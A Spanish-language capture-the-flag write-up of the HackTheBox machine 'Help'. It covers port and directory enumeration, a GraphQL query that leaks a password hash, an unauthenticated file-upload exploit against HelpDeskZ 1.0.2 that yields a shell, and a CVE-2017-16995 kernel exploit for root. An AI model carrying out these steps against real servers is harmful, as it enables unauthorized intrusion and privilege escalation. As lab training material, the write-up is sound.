# Help - HackTheBox

**Fecha de resolución:** 22 y 23 de septiembre de 2026

Máquina Linux, IP 10.129.61.14, hostname help.htb.

## Reconocimiento

Escaneo completo de puertos:

```
nmap 10.129.61.14 --privileged -sS -n --min-rate 5000 -vvv -oG allPorts
```

Tres puertos abiertos: 22 (SSH), 80 (HTTP) y 3000 (HTTP). Escaneo de versión sobre los tres:

```
nmap -p22,80,3000 -sS -sVC -n -oN targets 10.129.61.14
```

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework
```

El puerto 80 redirige a la vhost `help.htb`, que añadí al `/etc/hosts`. El puerto 3000 responde en JSON sin título, sin nada evidente todavía.

## Enumeración web

Fuzzing de directorios sobre la raíz:

```
gobuster dir -u http://help.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```

```
support              (Status: 301) [--> http://help.htb/support/]
```

Fuzzing sobre `/support`:

```
gobuster dir -u http://help.htb/support/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```

```
index.php           (Status: 200) [Size: 4413]
images               (Status: 301) [--> http://help.htb/support/images/]
uploads               (Status: 301) [--> http://help.htb/support/uploads/]
css               (Status: 301) [--> http://help.htb/support/css/]
includes               (Status: 301) [--> http://help.htb/support/includes/]
js               (Status: 301) [--> http://help.htb/support/js/]
```

La documentación del propio software, accesible en `/support`, confirma que se trata de HelpDeskZ, versión 1.0.2 de junio de 2015.

## Filtración de credenciales por GraphQL (vía no usada)

Antes de tocar HelpDeskZ probé el puerto 3000, que resultó ser una API GraphQL de una app Node/Express interna. Sondeé el objeto `user` pidiendo distintos campos hasta sacar usuario y contraseña:

```
curl http://help.htb:3000/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{user{username,password}}"}'
```

```
{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```

El hash es MD5 y Crackstation lo resuelve a `godhelpmeplz`. Esta contraseña es la del panel de HelpDeskZ (`?v=login`), pensada para otra vía de intrusión: iniciar sesión como staff y explotar una inyección SQL autenticada para volcar la base de datos. No hizo falta seguir por ahí porque la subida de archivos en HelpDeskZ ni siquiera exige estar logueado, así que dejé esta credencial de lado.

## Explotación: subida de archivo en HelpDeskZ 1.0.2

`searchsploit helpdeskz` devuelve una subida de shell no autenticada para HelpDeskZ <= 1.0.2:

```
searchsploit helpdeskz
searchsploit -m php/webapps/40300.py
```

El PoC (`40300.py`) venía escrito para Python 2 (`print` sin paréntesis, `hashlib.md5()` recibiendo directamente un `str`). Lo adapté a Python 3 (`print()`, `.encode('utf-8')` antes de hashear, `requests` en vez de `urllib2`) para poder ejecutarlo tal cual desde mi entorno.

El formulario de ticket (`?v=submit_ticket&action=displayForm`) acepta adjuntar un `.php`. Probé subiendo `shell.php` a mano desde el navegador para ver cómo respondía la aplicación:

```
GET /support/?v=submit_ticket&action=confirmationMsg&param[]=094-E86-EF98B&param[]=c38cd15c7710 HTTP/1.1
Host: help.htb
```

La respuesta muestra un aviso de "file not allowed", pero por debajo el archivo se guarda igual: el nombre final se calcula como `md5(nombre_original + time())` antes de comprobar la extensión, así que el filtro llega tarde. El exploit explota justo eso, recorriendo una ventana de segundos alrededor del momento de subida para recalcular el hash hasta encontrar el archivo ya alojado en `/support/uploads/`:

```
python3 40300.py http://help.htb/support/ shell.php
```

El script devolvió directamente la URL del `shell.php` subido. Con Penelope en escucha, solicité esa URL y capturé la conexión:

```
penelope -p 4444
curl http://help.htb/support/uploads/<hash-encontrado>.php
```

Shell interactiva obtenida. Flag de usuario capturada en el home del usuario bajo el que corre el servidor.

## Escalada a root

Con `uname -a` obtuve la versión exacta del kernel (serie 4.4 de Ubuntu 16.04). Busqué ese kernel en Google y encontré un repositorio de GitHub con una PoC en C para CVE-2017-16995 (escritura fuera de límites en la verificación de programas eBPF), que descargué como `exploit.c`. Lo compilé y ejecuté en la propia máquina:

```
gcc exploit.c -o exploit
./exploit
```

El exploit parchea la estructura `cred` del proceso en memoria del kernel y lanza una shell con uid 0. Shell de root obtenida y flag capturada.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
